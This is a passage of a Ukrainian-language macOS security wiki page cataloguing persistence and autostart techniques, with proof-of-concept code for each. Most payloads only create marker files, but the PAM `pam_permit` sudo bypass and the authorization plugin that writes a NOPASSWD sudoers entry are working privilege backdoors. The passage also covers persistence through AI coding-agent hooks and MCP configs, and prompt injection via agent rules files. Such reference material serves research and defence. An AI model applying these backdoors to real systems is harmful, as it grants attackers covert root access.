  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Віджети (Notification Center / WidgetKit)

Опис: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Розширення віджета працює у **власному процесі**, і його додавання **не** викликає сповіщення Background Task Management
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Файл config plist міститься в контейнері, захищеному TCC, тому для його редагування ззовні потрібен Full Disk Access або обхід TCC

#### Розташування

- Пакет розширення віджета: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Активні/зареєстровані віджети: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (ключі `widgets.instances` і `widgets.widgets`)

#### Опис і експлуатація

Розширення WidgetKit, вбудоване в програму, працює у **власному процесі**, яким керує Notification Center. Реєстрація екземпляра в `widgets.instances` (blob `CHSWidget` у форматі base64, закодований за допомогою `NSKeyedArchiver`, із вбудованими даними `INIntent`) і перезапуск NotificationCenter змушують віджет завантажитися та виконати код `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Правила Mail.app (запуск AppleScript)

Опис: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Mail.app має бути налаштовано з обліковим записом і запущено; тригером є вхідний лист
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Редагування правил/скриптів поза Mail може вимагати закриття Mail і надання Full Disk Access у сучасних версіях macOS

#### Розташування

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (локальні правила; `V10` у Sonoma/Sequoia, `V11`+ у новіших версіях)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (правила, синхронізовані через iCloud; мають пріоритет)
- Активація правил: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Опис і експлуатація

Правило Apple Mail може містити дію *«Run AppleScript»*. Додавши правило, яке відповідає спеціально сформованому **рядку теми** та запускає скрипт зловмисника, супротивник отримує **віддалено активоване, приховане** виконання коду в контексті Mail щоразу, коли надходить потрібний лист — цей вектор оминає багато засобів пошуку persistence, оскільки LaunchAgent/Login Item не створюється.<sup>[[42]](#references)</sup> Якщо налаштувати правило на **видалення** листа-тригера, це приховає докази. Захисники можуть шукати його безпосередньо:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Профілі конфігурації (.mobileconfig)

Опис: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - У сучасній macOS потрібне **ручне підтвердження користувача** в System Settings → *Керування пристроями* (тиха команда `profiles install` більше не працює поза MDM)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Встановлені профілі зберігаються в **`/Library/Managed Preferences/`** і **`/var/db/ConfigurationProfiles/`**; профіль — це XML plist із масивом `PayloadContent`.

#### Опис і експлуатація

`.mobileconfig` не є примітивом безпосереднього виконання коду, але може зберігати конфігурацію, наприклад **довірений кореневий CA** (`com.apple.security.root`), **глобальний проксі або PAC-проксі** (`com.apple.proxy.*`), **керовані параметри** (`com.apple.ManagedClient.preferences`) або обмеження. У macOS 10.15 і новіших версіях визначення Apple [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) вказує, що встановлення цього параметра в `true` для профілю, **встановленого вручну**, без payload із паролем для видалення вимагає **автентифікації адміністратора** для його видалення; це не робить профіль абсолютно невидалюваним. Для профілів, встановлених через MDM, діють окремі правила керування та видалення.<sup>[[44]](#references)</sup>

> [!WARNING]
> Звичайний профіль конфігурації **не має типу payload, який встановлює довільний `LaunchDaemon`/`LaunchAgent`**. Для встановлення daemon таким способом потрібні повне **зарахування до MDM** і агент/скрипт керування — не вважайте `.mobileconfig` механізмом доставки launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence через DYLD_INSERT_LIBRARIES

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **видаляє** `DYLD_*` для бінарних файлів із SIP/платформи, програм із hardened runtime та цілей setuid, тому впроваджує бібліотеки лише в незахищені процеси й **не** обходить SIP/hardened runtime
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Надійний варіант: словник **`EnvironmentVariables`** у plist шкідливого `LaunchAgent`/`LaunchDaemon` (запускається під час входу в систему/завантаження)
- Неактуальні/історичні (лише для звіту): **`~/.MacOSX/environment.plist`** (видалено в 10.8) і **`/etc/launchd.conf`** (видалено в 10.10)

#### Опис і експлуатація

Якщо зловмисник може додати `DYLD_INSERT_LIBRARIES` до середовища процесу-жертви, dyld завантажить dylib зловмисника (виконається її конструктор) у цей процес. Варіант із закріпленням embeds змінну в LaunchAgent, щоб кожен запуск завдання знову впроваджував бібліотеку. Зверніть увагу: у сучасних версіях macOS `launchctl setenv DYLD_*` фільтрується, тому натомість додайте її до plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Для повного опису механіки dylib injection/hijacking дивіться:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI-інструменти AI coding agent (hooks, MCP servers, файли rules)

Публікації: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [бекдор у файлі rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібно, щоб розробник використовував відповідний agent. Команди запуску виконуються з привілеями цього користувача, коли agent приймає його конфігурацію; правила довіри до workspace та схвалення MCP залежать від продукту й режиму сесії.
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle) (запускається від імені користувача; успадковує всі дозволи, які вже має terminal/agent)

#### Розташування

Явні файли конфігурації hook і MCP можуть спричинити **виконання shell-команд або дочірніх процесів під час використання інструмента розробником** — із глобального файлу користувача (persistence) або з файлу в репозиторії (ланцюг постачання). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` і правила редактора — це **інструкції для agent**, а не гарантоване виконання shell-команд під час читання; їхній вплив залежить від поведінки agent і дозволів інструментів. Перевіряйте актуальні правила довіри та схвалення для кожного продукту.

- **Claude Code**
  - `~/.claude/settings.json`, `.claude/settings.json` проєкту, `.claude/settings.local.json` і доступний лише root **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/керовані налаштування **не можна перевизначити** користувачеві → надійне persistence)
  - Об’єкт `hooks` — події `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — кожна запускає shell-команду `command`
  - `statusLine.command` — shell-команда, що виконується для відображення рядка стану (у кожній сесії)
  - MCP servers у `~/.claude.json` / `.mcp.json` проєкту — `command`+`args` запускаються як дочірні процеси
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — інструкції, за допомогою яких можна спробувати виконати prompt injection, залежно від поведінки agent і дозволів інструментів
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` запускаються як дочірні процеси); інструкції проєкту `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … запускають команди); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Опис і експлуатація

Якщо actor може змінювати глобальні налаштування облікового запису користувача, його hook або MCP-команди можуть запускатися в наступних сесіях цього облікового запису. Конфігурація, контрольована репозиторієм, — окремий випадок: [актуальна документація з безпеки Claude Code](https://code.claude.com/docs/en/security) описує інтерактивне діалогове вікно довіри до workspace та окремий запит на схвалення серверів `.mcp.json` проєкту. [Матриця дозволів](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) вказує, що hooks можуть запускатися після надання довіри батьківській теці, а сесії `claude -p`/SDK не показують інтерактивного запиту довіри; у цих неінтерактивних режимах сервери MCP проєкту підключаються без запиту на схвалення. Обхід hook проєкту до надання довіри, про який повідомлялося як про CVE-2025-59536, [виправили у 2025 році](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); не вважайте його типовою поведінкою зараз. Вектори доставки можуть включати скомпрометований репозиторій або шкідливий інсталятор. Prompt injection через файл rules менш передбачуваний, ніж явний hook, і все одно залежить від схвалення інструментів.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Приклад глобальних налаштувань Claude Code користувача; використовуйте їх для тестування лише в одноразовому обліковому записі:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Приклад глобальної конфігурації Codex MCP для користувача:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Приклад конфігурації hook для Cursor; перед використанням перевірте схему встановленої версії:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Розширення браузера (Chromium: Chrome / Brave / Edge)

Опис: [Зовнішні розширення Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Зловживання ExtensionInstallForcelist у macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібні браузер із підтримкою та встановлене й увімкнене розширення. Для External Extensions у macOS потрібне підтвердження користувача; для примусового встановлення через керовану політику потрібна відповідна корпоративна політика.
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Це не те саме, що **native messaging hosts** (див. розділ *Chrome native messaging hosts* вище). У цьому випадку механізм persistence — це саме **автоматично встановлене розширення**.

#### Розташування

- **JSON-файли External Extensions** (виявляються під час запуску браузера, після чого в macOS з’являється запит на ввімкнення):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (для користувача) або `/Library/Application Support/Google/Chrome/External Extensions/` (для всіх користувачів)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Примусове встановлення через корпоративну політику** за допомогою керованих налаштувань або профілю конфігурації:
  - ключ `ExtensionInstallForcelist` у `com.google.Chrome` (`com.brave.Browser` для Brave, `com.microsoft.Edge` для Edge); зчитується з `/Library/Managed Preferences/` або встановленого `.mobileconfig`

#### Опис і експлуатація

Це два різні способи встановлення. У [документації Chrome щодо зовнішнього встановлення](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) зазначено, що **користувачі Windows і macOS мають підтвердити встановлення та ввімкнути** розширення, запропоноване через файл *External Extensions*; саме лише створення цього JSON-файлу його не запускає. Для встановлення для всіх користувачів у macOS Chrome також вимагає, щоб файл зовнішнього розширення був захищений від змін із боку користувачів без привілеїв. Політика `ExtensionInstallForcelist` або `ExtensionSettings` дає змогу встановити й закріпити розширення без взаємодії з користувачем; [посібник Google з політик для Mac](https://support.google.com/chrome/a/answer/7517624) описує керовану конфігурацію та зазначає, що користувач не може видалити примусово встановлені розширення. Це спосіб розгортання через політику, а не короткий шлях через `defaults write` для окремого користувача.<sup>[[49]](#references)</sup>

> [!WARNING]
> У macOS маніфест JSON для *External Extensions* має вказувати URL оновлення **Chrome Web Store**, а не локальний CRX. Розгортання через керовану політику має власні корпоративні вимоги та може дозволяти керований URL оновлення на власному сервері. Для локального розпакованого розширення в тестовому профілі перемикач режиму розробника Chrome `--load-extension=/path` є окремим механізмом і не робить JSON-файл External Extensions таким, що виконується автоматично. Не вважайте запис до `Secure Preferences` еквівалентом будь-якого з двох документованих способів реєстрації.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Запустіть Chrome у цьому одноразовому обліковому записі й дочекайтеся запиту на ввімкнення; поведінка самого розширення є PoC виконання після згоди користувача. Після тесту видаліть маніфест і вимкніть або видаліть розширення в цьому профілі. Цей сценарій **не** перевіряли в активному профілі Chrome на дослідницькому Mac. Маршрут через керовану політику там також не розгортали.

Force-install і External Extensions посилаються на ідентифікатори розширень **Chrome Web Store**; про низькорівневий трюк із прихованим впровадженням локального розширення шляхом редагування підписаного HMAC файлу профілю `Secure Preferences` та інші способи зловживання процесами Chromium дивіться:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme та обробники типів файлів (LaunchServices)

Опис: [Віддалена експлуатація Mac через власні URL-схеми (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Тригером є натискання жертвою посилання (наприклад, у Chrome/Brave/Safari) або відкриття файлу зареєстрованого типу
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `Info.plist` пакета програми, у якому оголошено **`CFBundleURLTypes`/`CFBundleURLSchemes`** (власна URL-схема) або **`CFBundleDocumentTypes`** (розширення файлу/UTI)
- Ефективні значення за замовчуванням для користувача можуть міститися в **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (масив `LSHandlers`). Підтримуваний API Apple для вибору обробника URL-схеми за замовчуванням — `LSSetDefaultHandlerForURLScheme`; пряме редагування цього plist не є задокументованим способом реєстрації або оновлення кешу.

#### Опис та експлуатація

Launch Services отримує відомості про підтримувані URL-схеми й документи з `Info.plist` зареєстрованої програми. [Посібник Apple з реєстрації](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) зазначає, що реєстрація може відбуватися, коли Finder виявляє програму, під час завантаження або входу в систему чи через явний API реєстрації; просте розміщення програми в певному місці не гарантує негайного запуску цього процесу. Після реєстрації відкриття відповідної URL-адреси або документа може запустити вибрану програму-обробник з урахуванням вибору користувача щодо обробника за замовчуванням і стандартних перевірок запуску macOS. Підтримуваний API `LSSetDefaultHandlerForURLScheme` змінює вибраний користувачем обробник URL; він не забезпечує автоматичного запуску щойно доданої програми.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Жоден застосунок не реєстрували й жодних налаштувань обробників не змінювали на дослідницькому Mac з macOS 26.5.2. Щоб перевірити реальний обробник, скористайтеся одноразовим обліковим записом користувача, зареєструйте застосунок, який лише створює маркер, з унікальною схемою, викличте його URL, а потім видаліть застосунок і його реєстрацію.

Докладніше про перелік і зловживання обробниками розширень файлів і схем URL дивіться тут:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Файли запуску Python (`.pth` / `usercustomize` / `sitecustomize`)

Опис: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Виконується під час запуску відповідного інтерпретатора Python, якщо для нього ввімкнено цей каталог `site`; тригер не є універсальним для різних віртуальних середовищ, збірок Python і прапорців запуску
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Виконується з привілеями/TCC процесу, який запустив інтерпретатор

#### Розташування

- **`$(python3 -m site --user-site)/*.pth`** (збірки macOS framework: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Права root не потрібні (каталог доступний для запису користувачу)
  - **Тригер**: запуск цієї збірки Python з увімкненим user site; модуль `site` обробляє файли `.pth` в активних каталогах site
- **`<user-site>/usercustomize.py`**
  - Права root не потрібні
  - **Тригер**: запуск із увімкненим user site (автоматично імпортується модулем `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (наприклад, `/opt/homebrew/lib/python3.13/site-packages/` або системні шляхи)
  - Залежно від розташування інтерпретатора можуть знадобитися права root/admin
  - **Тригер**: запуск інтерпретатора, до якого входить цей каталог site

#### Опис і експлуатація

Під час запуску Python зазвичай імпортує `site` і сканує активні каталоги `site-packages` на наявність файлів `.pth`. Окрім додавання шляхів, рядок `.pth`, що починається з `import `, виконує код Python, навіть якщо вказаний модуль більше ніде не використовується. Python також намагається імпортувати `sitecustomize` і, **якщо user site увімкнено**, `usercustomize`.<sup>[[56]](#references)</sup> Тригером є подальший запуск інтерпретатора, який бачить змінений каталог. Прапорець `-S` вимикає обробку `site`; прапорці `-s`, `-I` або `PYTHONNOUSERSITE` вимикають варіанти для **user site**. Зазвичай `-I` не вимикає глобальний `sitecustomize`. Віртуальні середовища також можуть виключати user site. Перевірте `python3 -m site` для потрібного інтерпретатора.

Наведений нижче PoC запускали на macOS 26.5.2. Для цього тесту `PYTHONUSERBASE` переносить user site у тимчасовий каталог; реальний user site не змінюється:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Обидва маркери з’явилися. Повторний запуск із `-s`, `-I` або `-S` запобіг появі обох маркерів **user-site** у цьому тесті. `sitecustomize` у глобальному каталозі site не перевіряли.

## Обхід Root Sandbox

> [!TIP]
> Тут наведено точки автозапуску, корисні для **sandbox bypass**, що дає змогу просто виконати щось, **записавши це у файл**, маючи права **root** та/або за інших **незвичних умов**.

### Periodic

> [!CAUTION]
> **Історичний механізм:** На тестовій машині з macOS 26.5.2 відсутні `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` і демони запуску `com.apple.periodic-*`. Не припускайте, що створення `/etc/periodic` у сучасній системі запланує виконання його вмісту. Перш ніж використовувати наведений нижче приклад, перевірте на цільовій версії наявність і команди, і ввімкненого планувальника.

Опис: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Потрібні права root
  - **Тригер**: Коли настане час
- `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
  - Потрібні права root
  - **Тригер**: Коли настане час

#### Опис і експлуатація

У старіших версіях скрипти periodic (**`/etc/periodic`**) запускалися за розкладом **демонами запуску** з `/System/Library/LaunchDaemons/com.apple.periodic*`. Починаючи з macOS Big Sur 11.5, механізм запуску periodic виконував скрипти в каталогах periodic від імені **власника кожного файла**, усунувши попередній шлях підвищення привілеїв.<sup>[[27]](#references)</sup> Наведені нижче команди та списки каталогів — це історичний вивід, а не результати тестування macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Також існують інші періодичні скрипти, виконання яких зазначено у **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

У старіших системах, де `periodic` і його launch daemons були встановлені й увімкнені, `/etc/daily.local`, `/etc/weekly.local` і `/etc/monthly.local` були додатковими шляхами виконання. Безпечна перевірка лише для читання:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Правило на основі власника застосовувалося до скриптів безпосередньо в періодичних каталогах. Історична обгортка `999.local` раніше виконувала `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local` без такої самої перевірки власника; коли планувальник запускався від root, ці локальні файли виконувалися від root. Цю відмінність і зміну в Big Sur 11.5 описано в [оригінальному дослідженні](https://theevilbit.github.io/beyond/beyond_0019/). Не слід вважати, що будь-який із цих шляхів активний, якщо `periodic` відсутній.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібен root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Завжди потрібен root

#### Опис і експлуатація

Оскільки PAM більше зосереджений на **persistence** і malware, ніж на простому виконанні в macOS, у цьому блозі не буде детального пояснення; **прочитайте writeup, щоб краще зрозуміти цю техніку**.<sup>[[28]](#references)</sup>

Перевірте модулі PAM командою:

```bash
ls -l /etc/pam.d
```

Техніка закріплення/підвищення привілеїв із використанням PAM полягає в простій зміні файла /etc/pam.d/sudo: на початку потрібно додати рядок:

```bash
auth       sufficient     pam_permit.so
```

Тож це **виглядатиме** приблизно так:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

І тому будь-яка спроба використати **`sudo` спрацює**.

> [!CAUTION]
> Зверніть увагу, що цей каталог захищений TCC, тому, найімовірніше, користувач побачить запит на доступ.

Ще один хороший приклад — `su`: тут видно, що модулям PAM також можна передавати параметри (а цей файл також можна підмінити):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Плагіни авторизації

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібен root і додаткові налаштування
- Обхід TCC: ???

#### Розташування

- `/Library/Security/SecurityAgentPlugins/`
  - Потрібен root
  - Також потрібно налаштувати базу даних авторизації для використання плагіна

#### Опис і експлуатація

Ви можете створити плагін авторизації, який виконуватиметься під час входу користувача в систему, щоб забезпечити persistence. Щоб дізнатися більше про створення таких плагінів, перегляньте попередні writeup (і будьте обережні: через погано написаний плагін ви можете втратити доступ до системи, і тоді доведеться очищати Mac у режимі відновлення).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Перемістіть** bundle до місця, звідки його буде завантажено:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Насамкінець додайте **правило** для завантаження цього плагіна:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** повідомить фреймворку авторизації, що потрібно викликати зовнішній механізм авторизації. Крім того, **`privileged`** забезпечить його виконання від імені root.

Активуйте його за допомогою:

```bash
security authorize com.asdf.asdf
```

А потім група **staff** має мати доступ до sudo (перевірте це, прочитавши `/etc/sudoers`).

### Man.conf

Опис: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root, і користувач має використовувати man
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/private/etc/man.conf`**
  - Потрібні права root
  - **`/private/etc/man.conf`**: використовується щоразу, коли запускають man

#### Опис і експлуатація

Файл конфігурації **`/private/etc/man.conf`** визначає бінарний файл/скрипт, який запускається під час відкриття файлів документації man. Тому шлях до виконуваного файла можна змінити, щоб щоразу, коли користувач використовує man для читання документації, запускалася backdoor.<sup>[[31]](#references)</sup>

Наприклад, задайте в **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

А потім створіть `/tmp/view` як:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

